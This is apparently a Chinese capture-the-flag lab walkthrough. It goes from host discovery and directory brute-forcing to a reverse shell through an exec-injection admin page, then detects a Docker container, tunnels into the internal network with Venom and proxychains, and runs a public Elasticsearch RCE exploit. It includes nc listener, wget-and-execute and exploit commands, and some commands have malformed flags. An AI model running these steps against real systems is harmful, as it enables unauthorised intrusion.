打靶机过程：


因为kali攻击机和目标主机在相同网点内：

sudo arp-scan -l  #二层主机发现 识别目标主机的地址


确定目标机器IP以后进行全端口的扫描：

sudo nmap -P -A 192.168.140.254-sV 探测端口服务版本


打开浏览器访问默认的页面，发现只有一个页面：


查找隐藏的页面：

dirsearch  #安装dirsearch -u http://IP地址    #对目标地址进行隐藏目录的探测和爬取


输入以后发现了一个后台管理页面：


通过阅读代码逻辑，知道在输入框中输入的内容都会被交给exec进行执行

在输入框中输入一段反弹shell的代码，在kaili中进行监听

nc -nvlp 4444   #kali机器起监听的作用

（百度搜索 python 反弹shell 就能找到对应的代码）

看到存在dockerfile文件 ，去查看该文件 发现这个系统是部署在docker中的，以下两个命令都可以判断该系统是否是docker系统：

ls /.dockerenv  #查看是否存在该文件 若存在 说明该系统大概率是docker部署的
cat /proc/1/cgroup

以上内容基本上确定了现在是处于docker容器中。

所以我们需要做的操作是从docker容器中逃逸出来 进入到宿主机中。

查看本docker系统的IP：发现docker相当于宿主机 是在内网网段。


这个时候的思路应该是想办法去探测这个内网中是否有其他的主机

ping -c IP   #一个个尝试
但是由于这里太大了，就写个脚本进行批量的测试
for i in $(seq 1 10); do ping -c 172.17.0.$i;done#其中变量10是 设置测试的ip数量  这里可以写65535  看是否有没有返回包 来确认是否存在。

这里由于127的网段处于目标机器的内网，我们kali攻击机想要去内网的话 必须想办法内网穿透。

Venom 用来搭建内网隧道的工具。

先传输一个客户端脚本到目标主机上，本地运行服务端脚本

本地kali机器起一个http服务，然后在目标机器上wget获取该文件。

下载完成以后 给与可执行的权限。

chmod +x a 
./a -rhost 攻击机IP -rport 9999  #建立和服务器的链接

在kali这边可以发现有网络链接上了：


进入到这个节点1

goto 1 #进入这个节点socks 1080 #在这个节点上启动一个监听端口

接下来为了能够让kali机器的所有工具都能对目标IP进行攻击测试：

sudo vi /etc/proxychains4.conf #修改配置文件

修改为socks5  端口设置成上述的1080

代理挂好以后  开始对目标机器进行扫描：

前面知道了这个系统存在的两个存活IP。

proxychains nmap -Pn -sT 172.17.0.1


对这个IP进行服务版本的探测：



发现该页面和之前访问的页面一样；

说明10.0.0.2就是这个IP的宿主机

同样：再对0.2这个ip进行探测：发现就一个端口存在


可以对这个端口进行服务探测：

proxychains nmap -Pn -sT -p9200 -sV 172.17.0.2

看到这个显示出服务版本  所以尝试去寻找服务版本存在的EXP

searchsploit Elasticsearch  #查找EXP


把前面两个RCE的exp拷贝出来

先查看两个脚本文件的代码类型：（易知是py2）

cp /usr/share/exploitdb/exploits/linux/remote/36337.py
proxychains python2 36337.py 目的IP #运行脚本
